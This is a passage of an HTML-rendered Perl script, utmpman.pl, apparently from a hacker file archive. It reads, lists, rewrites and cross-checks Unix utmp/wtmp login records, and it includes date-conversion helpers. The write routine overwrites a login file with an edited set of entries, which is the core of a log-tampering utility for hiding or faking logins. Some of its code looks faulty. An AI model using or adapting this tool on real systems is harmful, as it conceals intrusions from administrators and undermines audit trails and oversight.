<P>&nbsp; foreach (sort( {$a &lt;=> $b} keys(%entries))) {
<BR>&nbsp;&nbsp;&nbsp; if (%{$entries{$_}}->{$op} =~ m/$data/i) {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; list_entry($_);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ++$count;
<BR>&nbsp;&nbsp;&nbsp; }
<BR>&nbsp; }
<BR>&nbsp; print "No $op entries matching $data.\n" if (!$count);
<BR>}
<BR>&nbsp;

<P>sub list_by_range {
<BR>&nbsp; my($range)=shift;
<BR>&nbsp; $range =~ m/(\d+)*-(\d+)*/;
<BR>&nbsp; my($lo, $hi)=($1, $2);
<BR>&nbsp;
<BR>&nbsp; $lo = 0 if (!defined($lo));
<BR>&nbsp; $hi = scalar(keys(%entries)) if (!defined($hi));
<BR>&nbsp;
<BR>&nbsp; foreach (sort( { $a &lt;=> $b } keys(%entries))) {
<BR>&nbsp;&nbsp;&nbsp; if (($_ >= $lo) &amp;&amp; ($_ &lt;= $hi)) {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; list_entry($_);
<BR>&nbsp;&nbsp;&nbsp; }
<BR>&nbsp; }
<BR>}
<BR>&nbsp;

<P>sub list_entry {
<BR>&nbsp; printf("#%3d - " . gmtime(%{$entries{$_}}->{"time"}), $_);
<BR>&nbsp; printf("&nbsp; %s/%s", @{$entries{$_}}{qw(id line)});
<BR>&nbsp; printf(": %s ", %{$entries{$_}}->{"user"})
<BR>&nbsp;&nbsp;&nbsp; if (%{$entries{$_}}->{"user"} ne pack("a8", ""));
<BR>&nbsp; printf("from %s", %{$entries{$_}}->{"host"})
<BR>&nbsp;&nbsp;&nbsp; if (%{$entries{$_}}->{"host"} ne pack("a16", ""));
<BR>&nbsp; if (%{$entries{$_}}->{"addr"} ne "\0\0\0\0") {
<BR>&nbsp;&nbsp;&nbsp; printf(" (%s)", longtodot4(%{$entries{$_}}->{"addr"}));
<BR>&nbsp; }
<BR>&nbsp; print ("\n");
<BR>&nbsp; printf("%7sPID = %u\n", "", %{$entries{$_}}->{"pid"})
<BR>&nbsp;&nbsp;&nbsp; if (%{$entries{$_}}->{"pid"} &amp;&amp; (%{$entries{$_}}->{"user"}
ne pack("a8","")));
<BR>}

<P># &lt;Silmaril> printf "#$_ - %s %s/%s: %s from %s\n", @{$v}->{qw(time
id line user host)};
<BR># &lt;Silmaril> now *that's* cool :-)
<BR># &lt;Silmaril> should be like this: @{$v}{qw(time id line user host)}
<BR># &lt;Silmaril> I had an extra -> in my first version.
<BR>#
<BR># Or course, it's changed since then, but - "Thanks, Sil!" :)
<BR>#
<BR>&nbsp;

<P># READ
<BR>&nbsp;

<P>sub read_func {
<BR>&nbsp; my($arg)=shift;
<BR>&nbsp;
<BR>&nbsp; $arg = $utmp_location if ($arg eq "utmp");
<BR>&nbsp; $arg = $wtmp_location if ($arg eq "wtmp");
<BR>&nbsp; $arg = $active_file if (!defined($arg));
<BR>&nbsp;
<BR>&nbsp; if ($arg !~ m!/*[uw]tmp[^/]*$!) {
<BR>&nbsp;&nbsp;&nbsp; print("read :: Filenames *must* start with either
'wtmp' or 'utmp' to be edited.\n");
<BR>&nbsp;&nbsp;&nbsp; return undef;
<BR>&nbsp; }
<BR>&nbsp;
<BR>&nbsp; readfile($arg);
<BR>}
<BR>&nbsp;

<P># WRITE

<P>sub write_func {
<BR>&nbsp; my($file)=shift;
<BR>&nbsp; my($count)=0;
<BR>&nbsp;
<BR>&nbsp; $file = $active_file if (!defined($file));
<BR>&nbsp; if ($file !~ m!/*[uw]tmp[^/]*$!) {
<BR>&nbsp;&nbsp;&nbsp; print ("write :: File must start with 'utmp' or
'wtmp'.\nRename file outside this program.\n");
<BR>&nbsp;&nbsp;&nbsp; return undef;
<BR>&nbsp; }
<BR>&nbsp; if (!open(OUTFILE, ">$file")) {
<BR>&nbsp;&nbsp;&nbsp; print ("write :: Can't open $file for output.\n");
<BR>&nbsp;&nbsp;&nbsp; return undef;
<BR>&nbsp; }
<BR>&nbsp; binmode(OUTFILE);
<BR>&nbsp;
<BR>&nbsp; foreach (sort( { $a &lt;=> $b } keys(%entries))) {
<BR>&nbsp;&nbsp;&nbsp; printf OUTFILE ("%s", pack("i L a12 a4 L a8 a16
a4",
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; @{$entries{$_}}{qw(type pid line id
time user host addr)}));
<BR>&nbsp;&nbsp;&nbsp; $count++;
<BR>&nbsp; }
<BR>&nbsp; print ("$active_file: " . scalar(keys(%entries)) . " entries
written.\n");
<BR>&nbsp; close(OUTFILE);
<BR>}
<BR>&nbsp;

<P># CHECK

<P>sub check_func {
<BR>&nbsp; if (push(@_)) {
<BR>&nbsp;&nbsp;&nbsp; print "check :: Invalid options specified. Please
see \"help\"\n";
<BR>&nbsp;&nbsp;&nbsp; return undef;
<BR>&nbsp; }
<BR>&nbsp; if ($active_file !~ m!/*utmp[^/]*$!) {
<BR>&nbsp;&nbsp;&nbsp; print "check :: Command can only be run on utmp
files.\n";
<BR>&nbsp;&nbsp;&nbsp; return undef;
<BR>&nbsp; }
<BR>&nbsp;
<BR>&nbsp; # Build struct of ports containing port name, device num and
owner.
<BR>&nbsp; # Note: Test run in grepstr may *not* be portable for all Unix
<BR>&nbsp; #&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; types. Be forewarned!
This was designed for Linux.
<BR>&nbsp; # Hint: For all intents and purposes, s/^$ttybase([$ttyrange][$ttyports])$/
<BR>&nbsp; #&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; should return the same
as what you expect in "struct utmp->ut_id".
<BR>&nbsp; my($grepstr) = "^($ttybase\[$ttyrange\]\[$ttyports\])\$";
<BR>&nbsp; my(%ports) = {};
<BR>&nbsp; my($user, $rdev) = ();

<P>&nbsp; opendir(DEVDIR, "/dev");
<BR>&nbsp; my(@devfiles) = readdir(DEVDIR);
<BR>&nbsp; @devfiles = grep(/$grepstr/, @devfiles);
<BR>&nbsp; close(DEVDIR);
<BR>&nbsp; foreach (@devfiles) {
<BR>&nbsp;&nbsp;&nbsp; /^$ttybase([$ttyrange][$ttyports])$/;
<BR>&nbsp;&nbsp;&nbsp; if (!defined($1)) {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print "check :: Warning! Could not extract
port ID from $_.\n";
<BR>&nbsp;&nbsp;&nbsp; } else {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ($user, $rdev) = (stat("/dev/$_"))[4,
6];
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $user = getpwuid($user);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $ports{$1} = newport($_, $rdev, $user);
<BR>&nbsp;&nbsp;&nbsp; }
<BR>&nbsp; }
<BR>&nbsp;
<BR>&nbsp; # Check ownership of /dev ports.
<BR>&nbsp; my(@logdev)=();
<BR>&nbsp; foreach (sort(keys(%ports))) {
<BR>&nbsp;&nbsp;&nbsp; push(@logdev, $_) if (%{$ports{$_}}->{"owner"} ne
"root");
<BR>&nbsp; }
<BR>&nbsp; @logdev = sort(@logdev);
<BR>&nbsp;
<BR>&nbsp; # Check utmp (against ports detected as logged in);
<BR>&nbsp; my(@logutmp)=();
<BR>&nbsp; foreach (sort( { $a &lt;=> $b } keys(%entries))) {
<BR>&nbsp;&nbsp;&nbsp; if (defined(%{$entries{$_}}->{"user"}) &amp;&amp;
defined(%{$entries{$_}}->{"host"}) &amp;&amp;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; defined(%{$entries{$_}}->{"id"})&nbsp;&nbsp;
&amp;&amp; defined(%{$entries{$_}}->{"pid"})) {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push(@logutmp, %{$entries{$_}}->{"id"})
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ((%{$entries{$_}}->{"id"}
=~ /[$ttyrange][$ttyports]/) &amp;&amp;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
((%{$entries{$_}}->{"user"} ne pack("a8", "")) ||
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
((%{$entries{$_}}->{"host"} ne pack("a16", "")) &amp;&amp;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
(%{$entries{$_}}->{"id"} ne pack("a4", "")) &amp;&amp;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
(%{$entries{$_}}->{"line"} ne pack("a12", "")) &amp;&amp;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
(%{$entries{$_}}->{"pid"} > 0))));
<BR>&nbsp;&nbsp;&nbsp; }
<BR>&nbsp; }
<BR>&nbsp; @logutmp = sort(@logutmp);

<P>&nbsp; # Check PIDs (find processes with active port ids)
<BR>&nbsp; opendir(PIDDIR, "/proc");
<BR>&nbsp; my(%processes) = {};
<BR>&nbsp; my(@portprocesses) = ();
<BR>&nbsp; foreach (grep(/\d+/, readdir(PIDDIR))) {
<BR>&nbsp;&nbsp;&nbsp; local($procdata, $cmdline);
<BR>&nbsp;&nbsp;&nbsp; open(PROCFILE, "&lt;/proc/$_/stat");
<BR>&nbsp;&nbsp;&nbsp; $procdata = &lt;PROCFILE>;
<BR>&nbsp;&nbsp;&nbsp; close(PROCFILE);
<BR>&nbsp;&nbsp;&nbsp; if (-e "/proc/$_/stat") {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; local($cmdline, $devnum, $portid);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ($cmd, $devnum) = (split(/ /, $procdata))[1,
6];
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # Remove surrouding () from command
name.
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $cmd =~ s/[\(\)]//g;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $portid = dev2id(\%ports, $devnum);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (defined($portid)) {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push(@portprocesses, $portid)
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!defined(listpos(\@portprocesses,
$portid))&amp;&amp;($$ != $_));
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $processes{$_} = newproc($cmd,
$portid) if (defined($portid) &amp;&amp; ($$ != $_));
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }
<BR>&nbsp;&nbsp;&nbsp; }
<BR>&nbsp; }
<BR>&nbsp; close(PIDDIR);

<P>&nbsp; # A port is *not* logged in if there is no dev entry for port,
no utmp entry
<BR>&nbsp; # and no active processes.
<BR>&nbsp; my(@validshellports) = ();
<BR>&nbsp; foreach (sort( { $a &lt;=> $b} keys(%processes))) {
<BR>&nbsp;&nbsp;&nbsp; push(@validshellports, %{$processes{$_}}->{"port"})
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (defined(listpos(\@shells, %{$processes{$_}}->{"cmd"}))&amp;&amp;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; !defined(listpos(\@validshellports,
%{$processes{$_}}->{"port"})));
<BR>&nbsp; }
<BR>&nbsp; # Remove ports with valid shells from list of ports with active
processes.
<BR>&nbsp; my(@noshellports) =
<BR>&nbsp;&nbsp;&nbsp; sort(grep(!defined(listpos(\@validshellports, $_)),
@portprocesses));
<BR>&nbsp; @validshellports = sort(@validshellports);
<BR>&nbsp; print "Ports with active /dev files: @logdev\n"
<BR>&nbsp;&nbsp;&nbsp; if (defined(@logdev));
<BR>&nbsp; print "Ports with utmp entries: @logutmp\n"
<BR>&nbsp;&nbsp;&nbsp; if (defined(@logutmp));
<BR>&nbsp; print "Ports with valid shells: @validshellports\n"
<BR>&nbsp;&nbsp;&nbsp; if (defined(@validshellports));
<BR>&nbsp; print "Ports with active processes and *no* shells: @noshellports\n"
<BR>&nbsp;&nbsp;&nbsp; if (defined(@noshellports));
<BR>}
<BR>&nbsp;
<BR>&nbsp;
<BR># GENERAL

<P>sub readfile {
<BR>&nbsp; local($file);
<BR>&nbsp; $file = shift;
<BR>&nbsp; my($index)=1;
<BR>&nbsp; my($buffer)="";

<P>&nbsp; # Insure we have a clean hash table before we start reading in
the file.
<BR>&nbsp; foreach (keys(%entries)) {
<BR>&nbsp;&nbsp;&nbsp; undef(%{$entries{$_}});
<BR>&nbsp;&nbsp;&nbsp; delete(${entries{$_}});
<BR>&nbsp; }
<BR>&nbsp;
<BR>&nbsp; open(UTMPFILE, "&lt;$file") || die("utmp-parse: Can't open $file
- $!\n");
<BR>&nbsp; binmode(UTMPFILE);
<BR>&nbsp; # 1/17/96, struct utmp is 56 bytes (54 according to addition!
:P).
<BR>&nbsp; while (read(UTMPFILE, $buffer, 56)) {
<BR>&nbsp;&nbsp;&nbsp; $entries{$index++} = newutmp($buffer);
<BR>&nbsp; }
<BR>&nbsp; $active_file = $file;
<BR>&nbsp; print ("$active_file: " . scalar(keys(%entries)) . " entries
loaded.\n");
<BR>&nbsp; close(UTMPFILE);
<BR>}
<BR>&nbsp;

<P>sub newutmp {
<BR>&nbsp; my($newbuff) = shift;
<BR>&nbsp; my($longaddr) = 0;
<BR>&nbsp;
<BR>&nbsp; $newnode = bless {
<BR>&nbsp;&nbsp;&nbsp; "type" => undef, "pid" => undef,&nbsp; "line" =>
undef, "id"&nbsp;&nbsp; => undef,
<BR>&nbsp;&nbsp;&nbsp; "time" => undef, "user" => undef, "host" => undef,
"addr" => undef
<BR>&nbsp; }, 'UTMPNODE';
<BR>&nbsp;
<BR>&nbsp; @{$newnode}{qw(type pid line id time user host addr)}=
<BR>&nbsp;&nbsp;&nbsp; unpack("i L a12 a4 L a8 a16 a4", $newbuff);
<BR>&nbsp;
<BR>&nbsp; return $newnode;
<BR>}
<BR>&nbsp;

<P>sub newport {
<BR>&nbsp;
<BR>&nbsp; $newnode = bless {
<BR>&nbsp;&nbsp;&nbsp; "port" => undef, "rdev" => undef, "owner" => undef,
"cmd" => undef,
<BR>&nbsp; }, 'PORTNODE';
<BR>&nbsp;
<BR>&nbsp; @{$newnode}{qw(port rdev owner)} = @_;
<BR>&nbsp;
<BR>&nbsp; return $newnode;
<BR>}
<BR>&nbsp;

<P>sub newproc {
<BR>&nbsp;
<BR>&nbsp; $newnode = bless {
<BR>&nbsp;&nbsp;&nbsp; "cmd" => undef, "port" => undef,
<BR>&nbsp; }, 'PROCNODE';
<BR>&nbsp;
<BR>&nbsp; @{$newnode}{qw(cmd port)} = @_;
<BR>&nbsp;
<BR>&nbsp; return $newnode;
<BR>}
<BR>&nbsp;

<P># Renumber hashes to default order.
<BR>sub resync {
<BR>&nbsp; my(%newhash) = ();
<BR>&nbsp; my($count)=0;

<P>&nbsp; # Write ordered list in to temporary hash, deleting as we go.
<BR>&nbsp; foreach (sort( {$a &lt;=> $b} keys(%entries))) {
<BR>&nbsp;&nbsp;&nbsp; $newhash{++$count} = $entries{$_};
<BR>&nbsp;&nbsp;&nbsp; delete($entries{$_});
<BR>&nbsp; }

<P>&nbsp; # Copy elements back in to original hash table.
<BR>&nbsp; foreach (sort( {$a &lt;=> $b} keys(%newhash))) {
<BR>&nbsp;&nbsp;&nbsp; $entries{$_} = $newhash{$_};
<BR>&nbsp; }
<BR>}
<BR>&nbsp;

<P>sub longtodot4 {
<BR>&nbsp; my($addr)=shift;

<P>&nbsp; return join(".", map( ord($_), split(//, $addr)));
<BR>}

<P>sub dev2id {
<BR>&nbsp; my($portlist, $rdev) = @_;

<P>&nbsp; foreach (sort(keys(%{$portlist}))) {
<BR>&nbsp;&nbsp;&nbsp; return $_ if (%{$portlist}->{$_}->{"rdev"}==$rdev);
<BR>&nbsp; }
<BR>&nbsp; return undef;
<BR>}
<BR>&nbsp;

<P>sub listpos {
<BR>&nbsp; my($arrayref, $search) = @_;
<BR>&nbsp; my($count) = 0;

<P>$^W = 0;
<BR>&nbsp; foreach (@{$arrayref}) {
<BR>&nbsp;&nbsp;&nbsp; return $count if ($search eq ${$arrayref}[$count]);
<BR>&nbsp;&nbsp;&nbsp; $count++;
<BR>&nbsp; }
<BR>$^W = 1;

<P>&nbsp; return undef;
<BR>}
<BR>&nbsp;

<P>### DATE ROUTINES

<P># The following code taken &amp; modified from the Date::Manip package.
<BR># Here is his copyright:
<BR>#
<BR>## Copyright (c) 1995,1996 Sullivan Beck. All rights reserved.
<BR>## This program is free software; you can redistribute it and/or modify
it
<BR>## under the same terms as Perl itself.
<BR>&nbsp;

<P>sub SecsSince1970 {
<BR># Parse as mm/dd/[cc]yy[:hh:mm[:ss]]
<BR>&nbsp; my($datetime) = shift;
<BR>&nbsp; my($m,$d,$y,$h,$mn,$s) = ();

<P>&nbsp; # If date is not defined, then return local current date and
time.
<BR>&nbsp; return time() if (!defined($datetime));

<P>&nbsp; $datetime =~
<BR>&nbsp;&nbsp;&nbsp; s!^(\d{1,2})/(\d{1,2})/(\d{4}|\d{2})(?:\:(\d{2}):(\d{2})(?:\:(\d{2}))?)?!!;
<BR>&nbsp; ($m, $d, $y, $h, $mn, $s) = ($1, $2, $3, $4, $5, $6);
<BR>&nbsp; $m--;

<P>&nbsp; # Finalize time components and check them.
<BR>&nbsp; $y = (($y &lt; 70) ? "20":"19" . $y) if (length($y)==2);

<P>&nbsp; # This checks for any *non-matched* portion of $datetime. If
there is such
<BR>&nbsp; # an animal, then there is illegal data specified. Also screens
for undefined
<BR>&nbsp; # components which HAVE to be in ANY valid date/time (ie, month,
day, year).
<BR>&nbsp; return undef if (!defined($m) || !defined($d) || !defined($y)
|| length($datetime));

<P>&nbsp; # Set time components with unspecified values.
<BR>&nbsp; $s = 0 if (!defined($s));
<BR>&nbsp; $mn = 0 if (!defined($mn));
<BR>&nbsp; $h = 0 if (!defined($h));

<P>&nbsp; # Check for ranges.
<BR>&nbsp; return undef if (($m > 11)&nbsp;&nbsp;&nbsp; || ($h > 23)&nbsp;&nbsp;&nbsp;
|| ($mn > 59)&nbsp;&nbsp; || ($s > 59));
<BR>&nbsp;
<BR>&nbsp; # Begin conversion to seconds since 1/1/70.
<BR>&nbsp; my($sec_now,$sec_70)=();
<BR>&nbsp; $sec_now=DaysSince999($m,$d,$y);
<BR>&nbsp; return undef if (!defined($sec_now));

<P>&nbsp; $sec_now--;
<BR>&nbsp; $sec_now = $sec_now*24*3600 + $h*3600 + $mn*60 + $s;
<BR>&nbsp; $sec_70 =30610224000;
<BR>&nbsp; return ($sec_now-$sec_70);
<BR>}
<BR>&nbsp;

<P>sub DaysSince999 {
<BR>&nbsp; my($m,$d,$y)=@_;
<BR>&nbsp; my($Ny,$N4,$N100,$N400,$dayofyear,$days)=();
<BR>&nbsp; my($cc,$yy)=();

<P>&nbsp; $y=~ /^(\d{2})(\d{2})$/;
<BR>&nbsp; ($cc,$yy)=($1,$2);

<P>&nbsp; # Number of full years since Dec 31, 0999
<BR>&nbsp; $Ny=$y-1000;

<P>&nbsp; # Number of full 4th years (incl. 1000) since Dec 31, 0999
<BR>&nbsp; $N4=int(($Ny-1)/4)+1;
<BR>&nbsp; $N4=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($y==1000);

<P>&nbsp; # Number of full 100th years (incl. 1000)
<BR>&nbsp; $N100=$cc-9;
<BR>&nbsp; $N100--&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($yy==0);

<P>&nbsp; # Number of full 400th years
<BR>&nbsp; $N400=int(($N100+1)/4);

<P>&nbsp; # Check to insure that information returns a valid day of year.
<BR>&nbsp; $dayofyear=dayofyear($m,$d,$y);
<BR>&nbsp; return undef if (!defined($dayofyear));

<P>&nbsp; # Compute day of year.
<BR>&nbsp; $days= $Ny*365 + $N4 - $N100 + $N400 + $dayofyear;

<P>&nbsp; return $days;
<BR>}
<BR>&nbsp;

<P>sub dayofyear {
<BR>&nbsp; my($m,$d,$y)=@_;
<BR>&nbsp; my(@daysinmonth)=(31,28,31,30,31,30,31,31,30,31,30,31);
<BR>&nbsp; my($daynum,$i)=();
<BR>&nbsp; $daysinmonth[1]=29&nbsp; if (!($y % 4));

<P>&nbsp; # Return error if we are given an invalid date.
<BR>&nbsp; return undef if ($d > $daysinmonth[$m]);

<P>&nbsp; $daynum=0;
<BR>&nbsp; for ($i=1; $i&lt;$m; $i++) {
<BR>&nbsp;&nbsp;&nbsp; $daynum += $daysinmonth[$i];
<BR>&nbsp; }
<BR>&nbsp; $daynum += $d;
<BR>&nbsp;
<BR>&nbsp; return $daynum;
<BR>}
<BR>&nbsp;

<P>## END DATE ROUTINES.
<BR>&nbsp;
<BR># End of script.

<P>0;

<P>--------------------- end of utmpman.pl

<BR>
<CENTER><A HREF="http://www.atomicfrog.com/archives/">Back to
Index</a></CENTER>
</BODY>
</HTML>
